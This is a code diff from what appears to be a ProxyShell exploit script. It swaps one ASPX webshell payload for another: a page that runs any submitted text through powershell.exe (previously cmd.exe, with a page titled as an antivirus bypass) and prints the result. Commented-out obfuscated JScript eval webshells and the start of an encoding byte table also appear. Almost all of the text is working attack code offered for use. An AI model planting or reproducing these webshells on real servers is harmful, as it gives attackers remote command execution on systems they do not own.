@@ -31,52 +31,81 @@ def webshell_payload():
     # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175
     #payload =  '<%@ Page Language="Jscript" %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/0/*-/*-*/-/*-/*-*/7/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>'
     #payload = '<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["exec_code"],"unsafe");}</script>'
-    payload = """<%@ Page Language="C#" Debug="true" Trace="false" %>
-<%@ Import Namespace="System.Diagnostics" %>
+    payload = """<%@ Page Language="C#" %>
+<%@ Import namespace="System.Diagnostics"%>
 <%@ Import Namespace="System.IO" %>
-<script Language="C#" runat="server">
 
-void Page_Load(object sender, EventArgs e){
-	
-}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
-[ValidateInput(false)]
-string myexec (string arg){
-	ProcessStartInfo mypsi = new ProcessStartInfo();
-	mypsi.FileName = "cmd.exe";
-
-	mypsi.Arguments = "/C "+arg;
-	mypsi.RedirectStandardOutput = true;
-	mypsi.UseShellExecute = false;
-	Process p = Process.Start(mypsi);
-	StreamReader stmrdr = p.StandardOutput;
-
-	string s = stmrdr.ReadToEnd();
-	stmrdr.Close();
-	return s;
-}
-
-void mycmdEXE(object sender, System.EventArgs e){
-	Response.Write("<pre id='Response'' style='Z-INDEX: 104; POSITION: absolute; TOP: 70px'>");
-	Response.Write(Server.HtmlEncode(myexec(txtArg.Text)));
-	Response.Write("</pre>");
-}
-
+<script runat="server">
+    private const string HEADER = "<html>\n<head>\n<title>command</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
+    private const string FOOTER = "</body>\n</html>\n";
+    /// <summary>
+    /// 
+    /// </summary>
+    /// <param name="sender"></param>
+    /// <param name="e"></param>
+    protected void Page_Load(object sender, EventArgs e)
+    {
+    }
+    /// <summary>
+    /// 
+    /// </summary>
+    /// <param name="sender"></param>
+    /// <param name="e"></param>
+    protected void btnExecute_Click(object sender, EventArgs e)
+    {
+        Response.Write(HEADER);
+        Response.Write("<pre>");
+        Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));
+        Response.Write("</pre>");
+        Response.Write(FOOTER);
+    }
+    /// <summary>
+    /// 
+    /// </summary>
+    /// <param name="command"></param>
+    /// <returns></returns>
+    private string ExecuteCommand(string command)
+    {
+        try
+        {
+            ProcessStartInfo processStartInfo = new ProcessStartInfo();
+            processStartInfo.FileName = "powershell.exe";
+            processStartInfo.Arguments = "/c " + command;
+            processStartInfo.RedirectStandardOutput = true;
+            processStartInfo.UseShellExecute = false;
+            Process process = Process.Start(processStartInfo);
+            using (StreamReader streamReader = process.StandardOutput)
+            {
+                string ret = streamReader.ReadToEnd();
+                return ret;
+            }
+        }
+        catch (Exception ex)
+        {
+            return ex.ToString();
+        }
+    }
 </script>
-<HTML>
-<HEAD>
-<title>ASPX Webshell bypass AV</title>
-</HEAD>
-<body>
-<form id="cmd" method="post" runat="server">
-<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT:170px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
-<asp:Button id="testing" style="Z-INDEX: 102; LEFT:430px; POSITION: absolute; TOP: 20px" runat="server" Text="execute" OnClick="mycmdEXE"></asp:Button>
-<asp:Label id="lblText" style="Z-INDEX: 103; LEFT:10px; POSITION: absolute; TOP: 22px" runat="server">Enter Your Command : </asp:Label><br/><br/>
-<hr/>
 
-</form>
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head id="Head1" runat="server">
+    <title>Command</title>
+</head>
+<body>
+    <form id="formCommand" runat="server">
+    <div>
+        <table>
+            <tr>
+                <td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
+                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
+            </tr>
+        </table>
+    </div>
+    </form>
 </body>
-</HTML>"""
+</html>"""
     compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
                0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
                0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
